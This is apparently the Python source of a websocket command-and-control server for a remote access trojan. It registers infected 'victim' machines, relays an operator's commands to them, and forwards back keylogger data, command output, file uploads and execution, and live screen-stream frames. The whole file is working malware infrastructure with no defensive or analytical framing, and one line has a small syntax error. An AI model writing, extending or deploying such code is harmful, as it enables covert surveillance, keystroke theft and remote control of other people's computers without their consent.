import sys
import os


import asyncio
import websockets
import uuid

victims = {}
rdid=None
controller = None  
background_controller=None

async def handler(websocket):
    global controller,rdid,background_controller
    try:
        first_msg = await websocket.recv()
        print(first_msg)
    except websockets.ConnectionClosed:
        return
    if first_msg.find("ROLE:BACKROUND")!=-1:
        global background_controller
        background_controller=websocket
        try
            for vid in victims.keys():
                if background_controller is not None:
                    await background_controller.send(f"EXISTING_VICTIM:{vid}")
        except:
            pass
    elif first_msg.find(":VICTIM-777777") !=-1:
        victim_id = first_msg[:first_msg.find(":VICTIM-777777")]
        victims[victim_id] = websocket
        rdid=victim_id
        if controller:
            await controller.send(f"NEW_VICTIM:{victim_id}")
            await background_controller.send(f"NEW_VICTIM:{victim_id}")
        
        try:
            async for message in websocket:
                print(message)

                if isinstance(message, bytes):
                    if controller:
                        await controller.send(message)
                

                elif isinstance(message, str):
                    if message.startswith((
                        "KEYLOG:", "OUTPUT:", "ERROR:", "PONG:", 
                        "READY_FOR_FILE", "BINARY_START_", "BINARY_END", "EXEC_FILE:","BINARY_END_FILE","LIVE_STREAM_FRAME"
                    )):
                        if controller:
                            await controller.send(message)
                    if message=="READY_FOR_FILE":
                        rdid=victim_id
                    

                    
        except Exception:
            pass
        finally:
            if victim_id in victims:
                del victims[victim_id]
                if controller:
                    await controller.send(f"VICTIM_LOST:{victim_id}")
    
    elif first_msg == "ROLE:CONTROLLER":
        controller = websocket
        

        for vid in victims.keys():
            await controller.send(f"EXISTING_VICTIM:{vid}")
        
        try:
            async for message in websocket:
                print(message)
                if message == "START_LIVE_STREAM" or message == "STOP_LIVE_STREAM":
                        # Send directly to ACTIVE victim (you already track this)
                        if victims:  # Since you only have one victim
                            victim_ws = next(iter(victims.values())) 
                            await victim_ws.send(message)
                if isinstance(message, str) and ":" in message:
                    parts = message.split(":", 2)
                    if len(parts) >= 2:
                        target_id = parts[0]
                        command = ":".join(parts[1:])
                        
                        if target_id in victims:
                            try:
                                await victims[target_id].send(command)
                            except:
                                await controller.send(f"ERROR: Victim {target_id} disconnected")
                        else:
                            await controller.send(f"ERROR: No victim {target_id}")
                elif message=="BINARY_END_FILE":
                    try:
                        await victims[rdid].send(message)
                        print(message)
                    except:
                        await controller.send(f"ERROR: Victim {rdid} disconnected")
                else:

                        await victims[rdid].send(message)
                
                    
                
        except Exception:
            pass
        finally:
            controller = None

async def main():
    server = await websockets.serve(handler, "0.0.0.0", 8765)
    await asyncio.Future()  

if __name__ == "__main__":
    asyncio.run(main())


